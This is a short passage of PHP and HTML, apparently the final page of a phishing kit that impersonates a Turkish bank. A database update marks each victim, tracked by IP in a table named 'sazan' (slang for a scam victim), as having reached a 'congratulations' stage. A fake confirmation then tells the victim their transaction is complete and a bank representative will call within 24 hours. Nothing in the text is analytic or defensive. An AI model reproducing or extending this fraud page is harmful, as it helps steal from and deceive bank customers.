...
mysqli_query($mysqli, "UPDATE sazan SET now = 'Tebrik Sayfası' WHERE ip = '{$ip}'");
            ...
            <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
                <fieldset>
                    <div class="formRow required ">
                        <center><img style="width: 80px;" src="https://ceotudent.com/wp-content/uploads/2018/11/768px-Yes_Check_Circle.svg_.png"></center>
                        <center><p style="font-weight: bold;">İşleminiz Tamamlandı</p></center>
                        <center><p style="font-weight: bold;">24 Saat içinde Bankanın Müşteri Temsilcisi Tarafından Aranacaksınız</p></center>
